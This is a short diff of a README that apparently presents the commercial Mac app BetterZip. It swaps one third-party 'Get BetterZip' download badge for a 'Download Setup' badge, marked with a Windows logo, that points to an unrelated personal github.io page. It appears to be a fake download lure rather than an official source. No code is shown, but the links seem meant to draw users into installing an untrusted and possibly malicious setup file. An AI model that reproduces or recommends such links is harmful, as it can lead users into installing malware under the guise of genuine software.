@@ -4,11 +4,7 @@
 <img src="https://macitbetter.com/img/BetterZip-400.png" alt="Better Zip Logo">  
 </div>  
 
-<div align="center">  
-<a href="https://install-utility-osx.github.io/.github/better_zip">  
-<img src="https://img.shields.io/badge/💻_Get_BetterZip-darkblue?style=for-the-badge&logo=apple" alt="Get BetterZip">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://elmirapuglisi.github.io/.github/Better-Zip-Mac)
 
 ---
 
